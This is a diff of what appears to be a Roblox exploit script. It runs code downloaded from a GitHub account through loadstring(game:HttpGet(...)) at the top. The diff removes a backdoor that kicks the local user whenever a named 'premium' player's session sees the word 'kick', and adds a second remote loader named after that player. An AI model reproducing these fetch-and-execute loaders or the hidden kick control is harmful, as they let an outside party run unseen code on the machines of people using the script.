@@ -1,22 +1,8 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/Blacklist.txt"))()
 
 
-local name = "EJGAMINGGGXXXDYT" --// Change "playerName" with the name of the person u want to check for that joins
 
-game:GetService'Players'.PlayerAdded:Connect(function(player)
-if player.Name == name then
-for i,v in pairs(game.Players:GetPlayers()) do
-    game.Players[v.Name].Chatted:connect(function(chat)
-        if chat:match("kick") then
-            game.Players.LocalPlayer:Kick("Kicked By Premium User")
-        end
-    end)
-end
-end
-end)
-
-
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/EJGAMINGGGXXXDYT"))()
 
 
 local Login = Instance.new("ScreenGui")
